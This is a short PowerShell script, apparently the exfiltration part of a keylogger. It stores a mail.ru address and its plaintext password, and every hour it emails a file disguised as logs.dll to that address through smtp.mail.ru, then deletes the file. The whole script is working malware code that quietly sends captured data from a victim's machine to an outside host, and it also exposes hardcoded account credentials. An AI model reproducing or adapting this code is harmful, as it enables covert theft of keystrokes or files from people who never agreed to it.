# Custom
$global:ke_email = "blabla.97@internet.ru"
$global:ke_emailp = "RnvPsWFwUcrSKVnRnsU2"
$global:ke_emailp = ConvertTo-SecureString $global:ke_emailp -AsPlainText -Force
$global:ke_email_att = "$PSScriptRoot\logs.dll"

while($true) {

  Start-Sleep -Seconds 3600
  Send-MailMessage -From $global:ke_email -To $global:ke_email -Subject "k" -Attachment $global:ke_email_att -SmtpServer "smtp.mail.ru" -Port 587 -UseSsl -Credential (New-Object System.Management.Automation.PSCredential -ArgumentList $global:ke_email, $global:ke_emailp)
  Remove-Item $PSScriptRoot\logs.dll

}
